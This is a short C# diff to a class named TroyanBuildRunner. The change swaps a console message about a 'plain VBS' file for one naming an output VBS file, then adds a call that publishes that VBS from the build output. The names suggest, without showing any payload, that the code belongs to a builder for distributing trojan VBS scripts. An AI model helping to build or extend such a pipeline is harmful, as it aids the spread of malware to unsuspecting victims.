@@ -33,6 +33,7 @@ public sealed class TroyanBuildRunner : ITroyanBuildRunner
 
         var layout = panelService.Layout();
         _plainVbs.Write(layout);
-        Console.WriteLine("Plain VBS: " + layout.TroyanPlainVbs);
+        Console.WriteLine("VBS (_output): " + layout.TroyanOutputVbs);
+        panelService.PublishTroyanVbsFromBuildOutput(layout);
     }
 }
